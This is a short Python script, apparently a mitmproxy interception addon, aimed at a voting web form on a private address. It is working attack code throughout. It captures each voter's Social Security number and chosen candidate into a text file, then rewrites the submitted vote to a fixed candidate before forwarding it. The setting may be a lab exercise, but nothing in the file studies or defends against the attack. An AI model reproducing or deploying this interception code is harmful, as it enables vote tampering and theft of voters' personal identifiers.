collected_ssns = []

def is_target_post(request):
    proper_req_type = request.method == "POST" and request.path == "/"
    proper_url = request.url == "http://10.64.6.2:8888/"
    has_proper_queries = request.urlencoded_form.get_all('canidate')
    return proper_req_type and has_proper_queries and proper_url

def record_voter_info(request):
    ssn = request.urlencoded_form['SSN']
    vote = request.urlencoded_form['canidate']
    if ssn not in collected_ssns:
        with open("voter_info.txt", 'a+') as f:
            f.write(f'SSN: {ssn}\tVoted For: {vote}\n')
        collected_ssns.append(ssn)

def request(flow):
    request = flow.request
    if is_target_post(request):
        record_voter_info(request)
        request.urlencoded_form['canidate'] = 'KeithDeSantis'
